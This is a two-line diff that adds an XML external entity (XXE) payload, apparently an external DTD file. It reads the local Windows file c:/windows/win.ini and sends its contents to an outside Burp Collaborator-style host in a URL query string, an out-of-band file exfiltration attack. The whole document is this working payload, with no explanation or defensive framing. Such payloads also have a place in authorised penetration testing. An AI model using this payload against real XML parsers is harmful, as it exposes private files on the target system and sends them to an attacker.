@@ -1,0 +1,2 @@
+<!ENTITY % data SYSTEM "file:///c:/windows/win.ini">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'https://qpj6hexki95cbfiqfez8x5gzoquhid62.burp.csirapp.com/?%data;'>">
